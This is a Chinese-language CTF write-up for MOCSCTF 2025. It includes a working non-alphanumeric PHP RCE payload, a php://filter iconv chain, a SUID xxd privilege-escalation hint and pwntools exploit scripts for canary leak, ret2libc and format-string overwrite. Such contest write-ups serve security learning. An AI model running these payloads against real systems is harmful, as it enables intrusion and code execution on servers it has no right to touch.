---
title: "Mocsctf2025 Wp"
subtitle: ""
date: 2025-07-17T19:20:00+08:00
lastmod: 2025-07-17T19:20:00+08:00
draft: false
author: ""
authorLink: ""
license: ""

tags: ["crypto"]
categories: ["CTF"]

featuredImage: ""
featuredImagePreview: ""

summary: ""

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
  auto: true

mapbox:
share:
  enable: true
comment:
  enable: true
---

## 前言

澳门的一个比赛，奖品比较好，就冲了xd，复盘一下，后面会补题

## web

### shuke-beita

这个真的是签到了xd，f12进去可以看见一行`(document.body.innerHTML = "请关闭开发者工具以继续使用本网站")`，我们比较叛逆，直接打开，然后运行游戏抓个包，f12里面就看见flag了，无敌了

### ez-rce

不算特别难，抓包得到`<!-- /s3cret/rce.php -->`，进去尝试rce即可，过滤了很多东西，打自增绕过，详细分析看[这个](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

字符更少的版本
```
$_=[].'_'; //空数组拼接一个字符，会将空数组变成字符串Array
$__=$_[1];//$__是r
$_=$_[0];//$_这时是A
$_++;//$_这时是B，每++一次就是下一个字母
$_++;//C
$_0=$_;//把c给$_0
$_++;//D
$_++;//E
$_++;//F
$_++;//G
$_=$_0.++$_.$__;//$_=CHr
$_='_'.$_(71).$_(69).$_(84);//$_='_'.CHR(71).CHR(69).CHR(84) -> $_=_GET
//$$_[1]($$_[2]);//$_GET[1]($_GET[2])
echo $_;
#_GET
```

完整paylaod

```
/s3cret/rce.php?MOCSCTF2025=%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B&_=system&__=cat%20fl49.php
```


### ez-pop

感觉这个更简单一些，`composer.json`可以找到`"guzzlehttp/guzzle": "^7.9"`，这里直接查询

```
./phpggc -l guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *
```

打WF1即可，然后上传

### ez-write

[出题人wp](https://fushuling.com/index.php/2025/07/14/mocsctf2025-ez-writeez-injection/)

自己写的时候发现可以`${ }`包裹执行，访问`${include $_GET[1]}`可以拿到路径，然后发现可以读取，但是不知道flag在哪里，后面其实明白了就算知道也不行，因为没有权限

后面翻到了陆队的博客，找到了`PHP Base64 Filter`，后面结束了队友跟我说这是测信道攻击？不太懂xd，废了

```
http://public-chall-2025.mocsctf.com:31005/tmp/046342ca1db298c5.php?1=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&a=
```

执行没有权限的，查一下suid，可以xxd提权，flag就搞定了

## Crypto

好像都挺简单的？

### ez-matrix

这个就是判断矩阵里面的元素好像，直接搓个脚本就行了，略了

### ez-learning

第一部分直接分解n，第二部分费马分解，第三部分小e攻击，第四部分共模攻击

### ez-klepto

Y可以开平方分解出来PQ，s的恢复方法是`s=pow(n>>1024,d_Y,Y)`，然后利用漏洞恢复p即可`p = gmpy2.next_prime(int(sha256(str(s).encode() * 4).hexdigest(), 16))`

后面求出q，直接拿q算就行了

### ez-math

当时时间比较紧，ai一把梭出来了，现在看看

pq直接开平方出来，后面的处理就是crt了xd

### ez-bcrypt(补题)

抽象题哥们，bp爆破，看响应，部分会有flag

### ez-DHKE(补题)

task.py
```python
import numpy as np
from Crypto.Cipher import AES
import hashlib
from Crypto.Util.Padding import pad

flag = b'*****'

theta = lambda a,b: 1 if a == b else 0

def encrypt(key, iv, plaintext):
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return cipher.encrypt(pad(plaintext, 16)).hex()

class TPM:
    def __init__(self, k=3, n=4, l=6, rule="rule1"):

        self.k = k
        self.n = n
        self.l = l
        self.W = np.random.randint(-l, l + 1, (k, n))
        self.rule = rule

    def forward(self, x):

        self.x = x.reshape(self.W.shape)
        self.roe = np.sign(np.sum(self.W * self.x, axis=1))
        self.tau = np.prod(self.roe)
        return self.tau

    def hebian(self, tau):
        for (i, j), _ in np.ndenumerate(self.W):
            self.W[i, j] += self.x[i, j] * self.roe[i] * theta(self.tau, tau) * theta(self.roe[i], self.tau)
            self.W[i, j] = np.clip(self.W[i, j], -self.l, self.l)

    def random_walk(self, tau):
        for (i, j), _ in np.ndenumerate(self.W):
            self.W[i, j] += self.x[i, j] * theta(self.tau, tau) * theta(self.roe[i], self.tau)
            self.W[i, j] = np.clip(self.W[i, j], -self.l, self.l)
    def backward(self, tau):
        if self.rule == "rule1":
            self.hebian(tau)
        elif self.rule == "rule2":
            self.random_walk(tau)


k, l, n = 8, 10, 10
Alice = TPM(k, n, l, "rule1")
Bob = TPM(k, n, l, "rule1")

inputs = []
alice_taus = []
bob_taus = []

for _ in range(999):
    x = np.random.randint(-27, 28, Alice.n * Alice.k)
    t1 = Alice.forward(x)
    t2 = Bob.forward(x)
    inputs.append(list(x))
    alice_taus.append(t1)
    bob_taus.append(t2)
    if t1 == t2:
        Alice.backward(Bob.tau)
        Bob.backward(Alice.tau)

assert np.array_equal(Bob.W, Alice.W)
assert Bob.W.shape == (k, n)
sha256 = hashlib.sha256()
sha256.update(Alice.W.tobytes())
key = sha256.digest()

# another one
k,l,n = 3, 3, 3
Alice = TPM(k, n, l, "rule2")
Bob = TPM(k, n, l, "rule2")

for _ in range(888):
    x = np.random.randint(-25, 26, Alice.n * Alice.k)
    t1 = Alice.forward(x)
    t2 = Bob.forward(x)
    if t1 == t2:
        Alice.backward(Bob.tau)
        Bob.backward(Alice.tau)

assert np.array_equal(Bob.W, Alice.W)
assert Bob.W.shape == (k, n)
sha256 = hashlib.sha256()
sha256.update(Alice.W.tobytes())
iv = sha256.digest()
ct = encrypt(key, iv[:16], flag)
with open("output.py", "w") as f:
    f.write(f"ct = {ct}\n")
    f.write(f"inputs = {inputs}\n")
    f.write(f"alice_taus = {alice_taus}\n")
    f.write(f"bob_taus = {bob_taus}\n")
```

这个参考[这个exp](https://github.com/c0degolf/c0degolf.github.io/blob/9d00b3712c3254d890989beb54e3eb27096cacfa/src/content/posts/writeup/DeadSec%20ctf/deadsec2024.md#not-an-active-field-for-a-reason)，感觉自己也研究的不是很明白，只知道rule1是可以直接回溯的，rule2因为范围是3*3，且每个值的范围在[-3,3]，爆破7**9的可能就行，我脚本不是特别会写，md，以后补(咕咕咕)

## Pwn

### canary

泄露 canary 后直接 ret2backdoor

```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

payload = b"%11$p"
sl(payload)
ru(b"0x")
canary = int(r(len("91bfe76e41f43c00")), 16)
success(hex(canary))
payload = b"a" * 0x28 + p(canary) + b"a" * 8 + p(0x00000000004006F7)
s(payload)
ia()
```

### Stack

没开PIE和canary，溢出长度足够，泄露libc拿个/bin/sh然后直接system就行

```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

puts = 0x0000000000400520
prdi = 0x0000000000400843
sys = 0x0000000000400530
ret = 0x000000000040050E
payload = b"a" * 0x28 + p(prdi) + p(elf.got["puts"]) + p(puts) + p(0x00000000004006A8)
ps()
rl()
s(payload)
base = u(r(6).ljust(8, b"\0")) - 0x80970
success(hex(base))
binsh = base + 0x00000000001B3D88
payload = b"a" * 0x28 + p(prdi) + p(binsh) + p(ret) + p(sys)
s(payload)
ia()
```

### fmt
非栈上格式化字符串考点，给了无限次fmt次数，观察栈发现offset为13/16的地址指向offset为43的地址，于是先泄露栈基址，然后打连续指针改写返回地址为backdoor即可

```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

# 13 16 43
ru(b"Input your message: ")
sl(b"%6$p")
ru(b"0x")
stack = int(r(len("7ffd1cf35760")), 16) - 8
success(hex(stack))
sleep(1)
last_four_hex = stack & 0xFFFF
print(hex(last_four_hex)[2:])
num = int(hex(last_four_hex)[2:], 16)
ru(b"Input your message: ")
sl(b"%" + bytes(str(num).encode("utf-8")) + b"c%13$hn")
ru(b"Input your message: ")
sl(b"%" + bytes(str(0x128F).encode("utf-8")) + b"c%43$hn")
ru(b"Input your message: ")
sl(b"su str done!\0a")
ia()
```

## Re

我出的三题都很简单，就不写了xd

## Forensic

### easysqli

附件给了一个 access.log，可以看出来是在sql盲注，写个脚本

```python
import re
from urllib.parse import unquote

def extract_flag_from_log(log_file):
    pattern = r'MID\(.*?,(\d+),1\)\)\s*([!=><]+)\s*(\d+).*\).*Rons'
    position_to_ascii = {}
    with open(log_file, 'r', encoding='utf-8') as f:
        for line in f:
            decoded_line = unquote(line)
            match = re.search(pattern, decoded_line)
            if match:
                position = int(match.group(1))  # 字符位置
                operator = match.group(2)        # 比较运算符
                value = int(match.group(3))   
                if operator == '!=':
                    position_to_ascii[position] = value
    flag = ''
    for pos in sorted(position_to_ascii.keys()):
        ascii_value = position_to_ascii[pos]
        flag += chr(ascii_value)
    return flag

log_file = 'access.log'
flag = extract_flag_from_log(log_file)
print(f"Extracted flag: {flag}")
```

### easysword

在CTF-NetA中发现一个压缩包，进去可以猜出来是CRC爆破，直接PuzzleSolve一把梭就行了

## 后话

cry有两题等wp复现，mem那个取证比赛的时候没找到host，可惜了bro